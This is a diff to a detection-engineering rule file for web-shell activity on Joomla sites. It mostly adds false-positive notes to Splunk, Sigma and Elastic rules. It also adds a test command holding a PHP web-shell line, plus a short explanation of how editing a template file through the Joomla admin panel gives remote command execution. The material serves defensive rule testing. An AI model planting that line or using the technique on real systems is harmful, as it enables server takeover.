@@ -99,7 +99,8 @@
           "T1505.003"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management"
       },
       {
         "platform": "splunk",
@@ -114,7 +115,8 @@
         "confidence": "medium",
         "log_ids": [
           "1"
-        ]
+        ],
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management"
       },
       {
         "platform": "splunk",
@@ -129,7 +131,8 @@
         "confidence": "medium",
         "log_ids": [
           "11"
-        ]
+        ],
+        "false_positives": "Legitimate web application deployments, CMS plugin installations"
       },
       {
         "platform": "sigma",
@@ -141,7 +144,8 @@
           "T1505.003"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate web application deployments, CMS plugin installations"
       },
       {
         "platform": "sigma",
@@ -153,7 +157,8 @@
           "T1505.003"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate web application deployments, CMS plugin installations"
       },
       {
         "platform": "elastic",
@@ -164,7 +169,9 @@
           "T1190",
           "T1505.003"
         ],
-        "fidelity": "behavioral"
+        "fidelity": "behavioral",
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management",
+        "confidence": "high"
       }
     ],
     "visibility": {
@@ -205,7 +212,8 @@
         "Review PowerShell Script Block / Module Logs, Sysmon, Web proxy logs for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "system($_GET['<rand>']);"
     }
   },
   "explain": "Turns Joomla admin access into RCE by editing a template file:\n  system($_GET['<rand>']);   add this to a template PHP file (e.g. error.php) via Templates > Customise\nJoomla lets admins edit template source, so injecting a system() call and then requesting /templates/<theme>/error.php?<rand>=id runs commands as the web-server user."
